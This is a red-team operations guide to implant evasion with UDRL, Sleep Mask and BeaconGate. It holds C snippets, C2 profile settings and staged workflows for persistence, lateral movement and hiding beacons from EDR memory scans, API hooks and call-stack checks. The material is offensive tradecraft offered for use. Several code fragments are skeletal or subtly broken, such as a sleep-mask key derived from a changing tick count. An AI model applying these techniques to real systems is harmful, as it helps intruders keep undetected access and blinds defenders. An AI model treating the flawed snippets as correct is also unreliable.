# UDRL and Sleep Mask - Red Team Usage Guide

## Operational Scenarios

### Scenario 1: Long-Term Persistence with Memory Scanning

**Challenge**: Beacon running for weeks/months, periodic memory scans by EDR

**Solution**: UDRL + Sleep Mask

**Implementation**:
```c
// UDRL: Custom allocation to avoid VirtualAlloc detection
void* beacon = NtAllocateVirtualMemorySyscall(size, PAGE_EXECUTE_READ);

// Sleep Mask: RC4 encrypt during sleep
void sleep_mask(PSLEEPMASK_INFO info) {
    rc4_encrypt_all_regions(info, global_key);
}
```

**C2 Profile**:
```
set sleep "60";           # 60 second sleep
set jitter "20";          # 20% jitter
set beacon_gate "true";   # Enable masking during API calls
```

**Operational Benefits**:
- Memory scans see encrypted garbage
- Long sleeps reduce network footprint
- Survives periodic EDR memory scans

**OPSEC Considerations**:
- Longer sleeps increase scan evasion
- RC4 key management (don't hardcode)
- Test mask/unmask performance

### Scenario 2: Bypass Userland API Hooks

**Challenge**: EDR hooks all common APIs (VirtualAlloc, CreateThread, etc.)

**Solution**: UDRL + BeaconGate with custom syscalls

**Implementation**:
```c
// UDRL: Resolve direct syscalls
BEACON_SYSCALLS syscalls = {0};
hell_gate_resolve(&syscalls);
populate_beacon_syscalls(&syscalls);

// BeaconGate uses them automatically
// All Beacon API calls bypass hooks
```

**C2 Profile**:
```
set syscall_method "indirect";  # Use syscall numbers
set beacon_gate "true";          # Route through BeaconGate
```

**Operational Benefits**:
- Bypasses userland hooks completely
- EDR's userland component blind to activity
- Works with all BOFs without modification

**OPSEC Considerations**:
- Some EDRs monitor syscalls (kernel callbacks)
- Indirect syscalls may be flagged
- Consider call stack spoofing

### Scenario 3: Evade Call Stack Analysis

**Challenge**: EDR analyzes call stacks for suspicious patterns

**Solution**: BeaconGate with call stack spoofing

**Implementation**:
```c
void* beacon_gate_wrapper(FUNCTION_CALL* call) {
    // Spoof stack before API call
    spoof_stack_via_return_address_gadgets();

    // Execute API
    void* result = execute_syscall(call);

    // Restore stack
    restore_original_stack();

    return result;
}
```

**Techniques**:
- **VulcanRaven**: ROP-based stack spoofing
- **SilentMoonwalk**: Stack overwriting
- **Threadpool Abuse**: Execute via TP callbacks

**Operational Benefits**:
- Call stack looks benign
- Attribution harder (fake call chain)
- Evades stack-based detection rules

### Scenario 4: High-Security Environment

**Challenge**: Advanced EDR with multiple detection layers

**Solution**: Full stack (UDRL + Sleep Mask + BeaconGate)

**Implementation**:
```c
// UDRL
- Custom allocation (mapped sections)
- Direct syscalls (Hell's Gate)
- Memory region tracking

// Sleep Mask
- AES-256 encryption
- Selective masking (code only)
- Key derivation from system state

// BeaconGate
- All APIs proxied
- Call stack spoofing
- Syscall execution
- Memory masking during calls
```

**C2 Profile**:
```
set sleep "120";              # Long sleep
set jitter "50";              # High jitter
set syscall_method "indirect";
set beacon_gate "true";
```

**Operational Benefits**:
- Maximum evasion capability
- Survives sophisticated EDR
- Minimal detection surface

**OPSEC Considerations**:
- Complexity increases failure risk
- Thorough testing required
- May impact Beacon stability

## Deployment Strategies

### Strategy 1: Progressive Enhancement

Start simple, add complexity as needed:

**Phase 1: Basic Deployment**
```
Standard Beacon
- No UDRL/Sleep Mask
- Establish baseline
```

**Phase 2: Add Sleep Mask**
```
If memory scans detected:
- Deploy Sleep Mask
- Monitor for detection
```

**Phase 3: Add UDRL**
```
If allocation patterns detected:
- Deploy UDRL with custom allocation
- Continue monitoring
```

**Phase 4: Full Stack**
```
If call patterns detected:
- Add BeaconGate
- Enable all evasions
```

### Strategy 2: Environment-Based Selection

Choose configuration based on target environment:

**Low Security**:
```
- Standard Beacon
- Or minimal Sleep Mask
```

**Medium Security**:
```
- Sleep Mask (XOR)
- Basic UDRL (custom allocation)
```

**High Security**:
```
- UDRL (custom allocation + syscalls)
- Sleep Mask (RC4/AES)
- BeaconGate (optional)
```

**Maximum Security**:
```
- Full UDRL (all features)
- Advanced Sleep Mask (AES + selective)
- BeaconGate (stack spoofing + syscalls)
```

### Strategy 3: Capability-Based Deployment

Different payloads for different tasks:

**Initial Access**:
```
- Lightweight Beacon
- Minimal evasion
- Quick deployment
```

**Persistence**:
```
- Full Sleep Mask
- Long sleep times
- Memory scan evasion
```

**Lateral Movement**:
```
- UDRL + syscalls
- Bypass hooks
- Fast execution
```

**High-Value Target**:
```
- Full stack
- All evasions
- Maximum stealth
```

## BOF Development Considerations

### Transparent BOF Usage

BOFs work without modification:

```c
// BOF code
#include <windows.h>

void go(char* args, int len) {
    // These automatically use UDRL syscalls + BeaconGate
    void* mem = KERNEL32$VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_RW);
    HANDLE h = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    // BOF developer doesn't need to know about UDRL/BeaconGate
}
```

### BOF Best Practices with UDRL/BeaconGate

**1. Use Beacon APIs**:
```c
// Prefer this
BeaconVirtualAlloc();
BeaconOpenProcess();

// Over this
KERNEL32$VirtualAlloc();
KERNEL32$OpenProcess();

// Beacon APIs automatically adapt to configuration
```

**2. Avoid Assumptions**:
```c
// Don't assume execution method
// Code should work with:
// - Standard WinAPI
// - Syscalls
// - BeaconGate

// This is handled automatically
```

**3. Test Multiple Configurations**:
```c
// Test BOF with:
1. Standard Beacon
2. UDRL + syscalls
3. BeaconGate enabled
4. Full stack

// Ensure compatibility
```

## Operational Workflows

### Workflow 1: Initial Compromise to Persistence

```
Day 1: Initial Access
→ Deploy standard Beacon
→ Assess environment

Day 2: Environment Analysis
→ Identify EDR capabilities
→ Test memory scanning frequency
→ Check API hooking

Day 3: Enhanced Beacon
→ Deploy Sleep Mask for memory scan evasion
→ Monitor for detection

Day 4: Persistence
→ Deploy UDRL + Sleep Mask Beacon
→ Long sleep times (2-5 minutes)
→ Establish reliable persistence

Day 5+: Maintain Access
→ Monitor Beacon health
→ Adjust sleep/jitter as needed
→ Update evasions if detected
```

### Workflow 2: Lateral Movement

```
Preparation:
→ Build UDRL Beacon with syscalls
→ Test on similar environment
→ Package for deployment

Execution:
→ Deploy via WMI/PSExec/etc.
→ UDRL bypasses hooks on remote system
→ Beacon callbacks established

Post-Execution:
→ Switch to Sleep Mask Beacon for persistence
→ Remove initial access Beacon
→ Monitor new Beacon
```

### Workflow 3: High-Value Target Access

```
Intelligence Gathering:
→ Research target EDR
→ Identify detection capabilities
→ Plan evasion stack

Preparation:
→ Build full-stack Beacon (UDRL + Sleep Mask + BeaconGate)
→ Test against target EDR in lab
→ Verify all evasions working

Deployment:
→ Deploy via most covert method
→ Immediate sleep (5+ minutes)
→ Low activity profile

Operation:
→ Minimal tasking
→ Long sleep between tasks
→ Careful OPSEC
```

## Troubleshooting Operational Issues

### Issue: Beacon Crashes After Deployment

**Likely Cause**: UDRL/Sleep Mask mismatch

**Debug Steps**:
```
1. Check allocation strategy
   - UDRL using RWX? → Sleep Mask expects RWX
   - UDRL using RW + RX? → Sleep Mask must handle separate

2. Verify metadata passing
   - ALLOCATED_MEMORY_REGION populated?
   - DLL_BEACON_USER_DATA passed correctly?

3. Test in lab
   - Deploy to similar environment
   - Add debug logging
   - Identify crash point
```

**Solution**:
```c
// Align UDRL and Sleep Mask
// If UDRL uses RWX:
void* beacon = VirtualAlloc(..., PAGE_EXECUTE_READWRITE);

// Sleep Mask expects single RWX region
void sleep_mask(PSLEEPMASK_INFO info) {
    // Process single region
}
```

### Issue: Beacon Detected by EDR

**Likely Cause**: Evasion not working or incomplete

**Debug Steps**:
```
1. Identify detection vector
   - Memory scan? → Check Sleep Mask
   - API hook? → Check syscalls
   - Behavior? → Check call patterns

2. Verify evasions active
   - UDRL loaded correctly?
   - Sleep Mask masking?
   - BeaconGate proxying?

3. Test detection trigger
   - What specific action triggered alert?
   - Reproduce in lab
   - Identify detection signature
```

**Solution**:
```
If memory scan: Increase sleep time, verify masking
If API hook: Verify syscalls, check BeaconGate
If behavior: Reduce activity, change C2 profile
```

### Issue: BOF Fails with UDRL

**Likely Cause**: BOF incompatible with syscall method

**Debug Steps**:
```
1. Test BOF standalone
   - Works without UDRL? → Configuration issue
   - Fails standalone? → BOF bug

2. Check syscall compatibility
   - BOF using APIs not in syscall table?
   - Missing syscall resolution?

3. Test with BeaconGate disabled
   - Works without BeaconGate? → BeaconGate issue
   - Still fails? → UDRL issue
```

**Solution**:
```c
// Ensure all required syscalls resolved
// Or disable BeaconGate for specific BOF
// Or use Beacon helper APIs instead of direct WinAPI
```

## Advanced Techniques

### Technique 1: Key Derivation for Sleep Mask

Instead of hardcoded key:

```c
void derive_key_from_environment(BYTE* key, DWORD keylen) {
    // Derive from system state
    DWORD tick = GetTickCount();
    char hostname[256];
    GetComputerNameA(hostname, &size);

    // Hash to create key
    SHA256_CTX ctx;
    sha256_init(&ctx);
    sha256_update(&ctx, &tick, sizeof(tick));
    sha256_update(&ctx, hostname, strlen(hostname));
    sha256_final(&ctx, key);
}

// Use in Sleep Mask
BYTE key[32];
derive_key_from_environment(key, 32);
aes_encrypt(beacon, size, key);
```

**Benefits**:
- No hardcoded key in binary
- Unique per system
- Difficult to decrypt without system context

### Technique 2: Tiered Sleep Masking

Mask different regions with different algorithms:

```c
void tiered_sleep_mask(PSLEEPMASK_INFO info) {
    for (DWORD i = 0; i < info->region_count; i++) {
        ALLOCATED_MEMORY_REGION* region = &info->regions[i];

        if (region->purpose == BEACON_CODE) {
            // Heavy encryption for code
            aes_encrypt(region->base, region->size, key);
        }
        else if (region->purpose == BEACON_DATA) {
            // Light obfuscation for data
            xor_mask(region->base, region->size, 0xAA);
        }
        else {
            // Don't mask heap
        }
    }
}
```

**Benefits**:
- Performance optimization
- Selective security
- Flexibility

### Technique 3: Conditional BeaconGate

Only proxy suspicious APIs:

```c
void* beacon_gate_selective(FUNCTION_CALL* call) {
    // Suspicious APIs
    if (call->api_enum == API_VIRTUALALLOC ||
        call->api_enum == API_CREATETHREAD ||
        call->api_enum == API_OPENPROCESS) {

        // Full evasion
        mask_beacon();
        spoof_stack();
        result = syscall_execute(call);
        unmask_beacon();
    }
    else {
        // Normal execution for benign APIs
        result = normal_execute(call);
    }

    return result;
}
```

**Benefits**:
- Performance (less overhead)
- Reduced complexity
- Lower detection risk

## Measurement and Success Criteria

### Evasion Effectiveness Metrics

**Memory Scan Evasion**:
- Beacon survives periodic scans: ✅
- No memory-based detections: ✅
- Sleep Mask performance acceptable: ✅

**API Hook Evasion**:
- Syscalls working correctly: ✅
- No hook-based detections: ✅
- BOFs function normally: ✅

**Call Stack Analysis Evasion**:
- Stack spoofing active: ✅
- No stack-based detections: ✅
- No attribution from stack: ✅

### Performance Metrics

**Acceptable**:
- Sleep mask time: < 50ms
- BeaconGate overhead: < 20ms per API
- UDRL load time: < 100ms

**Warning**:
- Sleep mask time: 50-100ms
- BeaconGate overhead: 20-50ms per API
- UDRL load time: 100-200ms

**Unacceptable**:
- Sleep mask time: > 100ms
- BeaconGate overhead: > 50ms per API
- UDRL load time: > 200ms

## Conclusion

UDRL, Sleep Mask, and BeaconGate form a powerful evasion framework for sophisticated red team operations. Key operational principles:

1. **Progressive Enhancement**: Start simple, add complexity as needed
2. **Environment Adaptation**: Match evasion to threat level
3. **Thorough Testing**: Test all configurations before deployment
4. **OPSEC Discipline**: Don't over-engineer, maintain operational security
5. **Continuous Monitoring**: Watch for detection, adapt quickly

Master these techniques to operate effectively in heavily defended environments while maintaining stable, reliable C2 channels.
